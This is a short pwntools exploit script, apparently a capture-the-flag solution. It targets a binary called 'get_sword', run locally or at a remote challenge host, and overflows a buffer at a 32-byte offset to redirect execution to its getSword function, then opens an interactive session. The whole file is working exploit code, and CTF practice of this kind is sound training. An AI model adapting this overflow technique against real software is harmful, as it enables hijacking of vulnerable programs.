#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './get_sword'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib32/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '173.255.201.51', 31337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    offset = 32
    payload = flat({
        offset: [
            elf.sym['getSword']
        ]
    })

    io.sendlineafter(b':', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()